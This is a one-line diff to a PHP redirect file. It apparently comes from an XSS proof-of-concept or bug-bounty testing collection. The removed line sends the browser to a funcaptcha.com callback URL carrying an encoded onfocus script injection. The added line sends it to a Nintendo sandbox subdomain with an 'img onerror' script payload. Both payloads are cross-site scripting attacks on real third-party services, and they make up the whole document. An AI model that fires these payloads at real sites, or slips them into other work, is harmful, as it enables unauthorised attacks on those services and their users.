@@ -1,1 +1,1 @@
-<?php header('Location: https://funcaptcha.com/fc/a/?callback=%3Cx~%0Aonfocus=alert%28document.domain%29%20id=a%20tabindex=0%3E#a'); ?> 
+<?php header('Location: http://500bd53d90610f7fa5ba42cc27348bd9-sb.baas.nintendo.com/<img src=x onerror=alert(document.domain)>'); ?> 
